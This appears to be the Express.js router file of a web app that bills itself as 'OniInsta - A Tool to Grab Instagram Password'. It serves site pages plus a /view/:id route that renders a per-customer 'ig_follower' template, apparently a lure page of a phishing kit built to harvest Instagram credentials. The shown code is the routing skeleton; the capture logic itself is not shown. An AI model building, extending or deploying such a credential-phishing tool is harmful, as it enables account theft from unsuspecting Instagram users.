import api from './api.js';
import {Router} from 'express';
import Post from '../models/post.model.js';
import { TEL_URL } from '../config/constants.js';

const router = Router();

router.use('/api', api);

router.get('/view/:id', async (req ,res) => {
  const { id } = req.params;
  if(!id) {
    return res.status(400).json({error : 'ID Not Found'})
  }
  try {
    const info = await Post.findOne({cus_id : id});
    if(!info){
      return res.status(404).render('404');
    }
    res.render('templates/ig_follower', info)
    
  } catch (e) {
    return res.status(500).json({error : 'Server Error',})
  }
});


router.get('/', (req, res ) => {
  res.render('index', {title : 'OniInsta - A Tool to Grab Instagram Password in Few Simple steps'})
})
router.get('/about', (req, res ) => {
  res.render('about', {title : 'About Us'})
})

router.get('/contact', (req, res ) => {
  res.render('contact', {title : "Contact Us"})
})

router.post('/contact', (req, res ) => {
  console.log(req.body)
  res.render('contact', {title : "Contact Us"})
})



router.get('*', (req, res ) => {
  res.render('404', {title : "Not Found"})
})


export default router;